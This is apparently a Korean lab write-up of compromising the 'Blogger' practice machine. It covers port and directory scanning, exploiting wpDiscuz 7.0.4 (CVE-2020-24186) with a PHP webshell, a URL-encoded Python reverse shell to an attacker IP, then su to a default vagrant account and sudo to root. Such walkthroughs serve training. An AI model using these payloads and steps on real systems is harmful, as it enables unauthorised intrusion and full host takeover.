---
title: '[BHPT] Blogger'
layout: post
date: 2026-11-09 12:00:00 +0900
featured: /assets/images/redraccoon-logo.png
---

# 5.Blogger 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | blogger | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 06:39 EST
Nmap scan report for TARGET_IP
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds
```

포트 스캔 결과 포트 22, 80이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 22,80 -sV -sC -Pn --open TARGET_IP -oA tcpDetailed               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 06:43 EST
Nmap scan report for TARGET_IP
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7b:f1:81:f1:76:eb:05:b7:83:b8:48:e8:c0:a7:f8:ac (RSA)
|   256 e8:99:d0:e7:08:48:c5:e6:80:fa:bd:be:57:7f:41:2e (ECDSA)
|_  256 e1:c3:3f:27:93:b8:86:12:39:df:e2:7d:2a:5b:a9:de (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
```

디렉토리 브루트포싱으로 4개의 디렉토리가 301이 반환되는 것을 확인함.
```
└─$ gobuster dir --url http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://TARGET_IP/assets/]
/css                  (Status: 301) [Size: 314] [--> http://TARGET_IP/css/]
/images               (Status: 301) [Size: 317] [--> http://TARGET_IP/images/]
/index.html           (Status: 200) [Size: 46199]
/js                   (Status: 301) [Size: 313] [--> http://TARGET_IP/js/]
/server-status        (Status: 403) [Size: 279]
===============================================================
Finished
===============================================================
```

/assets 페이지를 접속하면 하위 디렉토리 fonts에 blog가 존재.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-blogger/image.png)

wpscan으로 /assets/blog 페이지를 스캔하였지만 취약점은 찾을 수 없어서 해당 접속해보기로함.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-blogger/image-1.png)
페이지 접근 시 css가 깨져 있으며, 소스를 조회해보면 http://blogger.thm/assets/fonts/blog/xmlrpc.php 을 통해 css를 불러오는 것을 확인함.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-blogger/image-2.png)

하위 디렉토리가 현재 접근한 웹과 구조가 비슷한 것을 확인하여, hosts에 domain을 등록 후 페이지에 다시 접근하면 css가 정상적으로 랜더링됨.
```
└─$ cat /etc/hosts
TARGET_IP  blogger.thm
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-blogger/image-3.png)


이후 wpscan을 통해 웹을 스캔하면 취약한 버전의 플러그인이 탐지가됨.
```
└─$ wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

.
.
.

[+] wpdiscuz
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2025-12-23T15:28:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.42
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
```




searchsploit툴을 이용하여 wpdiscuz 7.0.4의 익스플로잇 3개 발견함.
```
└─$ searchsploit wpdiscuz
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthentic | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthentic | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upl | php/webapps/49401.rb
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

RCE가 가능한 49967.py를 통해 익스플로잇을 시도해보았지만, 명령어를 입력하면 코드가 중지가됨.
```
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py -u http://blogger.thm/assets/fonts/blog -p '/?p=25'
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[59090] | code:[200]
[!] Got wmuSecurity value: 379a67c9e9
[!] Got wmuSecurity value: 25 

[+] Generating random name for Webshell...
[!] Generated webshell name: ymppusqdgkfalpj

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2026/01/ymppusqdgkfalpj-1768910491.5819.php&quot; 

> whoami

[x] Failed to execute PHP code...
```

curl을 통해 cmd 파라미터에 명령어를 친뒤 GET 요청시 RCE가 성공됨.
```
└─$ curl 'http://blogger.thm/assets/fonts/blog/wp-content/uploads/2026/01/srodhnfpbjcnfnw-1768910779.3728.php?cmd=id'
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
revshells.com에서 가져온 리버스 쉘을 URL로 인코딩하여 cmd 파라미터에 전송.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-blogger/image-5.png)

```
└─$ curl 'http://blogger.thm/assets/fonts/blog/wp-content/uploads/2026/01/srodhnfpbjcnfnw-1768910779.3728.php?cmd=%65%78%70%6f%72%74%20%52%48%4f%53%54%3d%22%31%30%2e%38%2e%31%2e%31%37%33%22%3b%65%78%70%6f%72%74%20%52%50%4f%52%54%3d%39%39%38%38%3b%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%48%4f%53%54%22%29%2c%69%6e%74%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%50%4f%52%54%22%29%29%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%27'
```

nc를 이용해 열어둔 소켓을 통해 쉘이 들어왔으며, tty shell 업그레이드를 진행.
```
└─$ nc -lvnp 9988
listening on [any] 9988 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 60448
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ ^Z
zsh: suspended  nc -lvnp 9988
┌──(kali㉿kali)-[~/Desktop/blogger]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9988
                               reset
reset: unknown terminal type unknown
Terminal type? xterm-256color
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

passwd에서 가상머신을 관리할 때 사용되는 vagrant계정이 확인됨.
```
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
.
.
.
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
james:x:1002:1002:James M Brunner,,,:/home/james:/bin/bash
```

vagrant의 초기 비밀번호는 [REDACTED_PASSWORD]으로 su로 권한상승 시도.
```
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ su vagrant
Password: 
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

권한상승한 계정의 sudo권한을 확인해보면 NOPASSWD: ALL로 확인되어, sudo su -명령어로 root 계정으로 권한상승함.
```
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ sudo -l
Matching Defaults entries for vagrant on
    ip-172-31-141-155.ap-northeast-2.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on
        ip-172-31-141-155.ap-northeast-2.compute.internal:
    (ALL) NOPASSWD: ALL
<ress/assets/fonts/blog/wp-content/uploads/2026/01$ sudo su -
root@ip-172-31-141-155:~# id
uid=0(root) gid=0(root) groups=0(root)
```

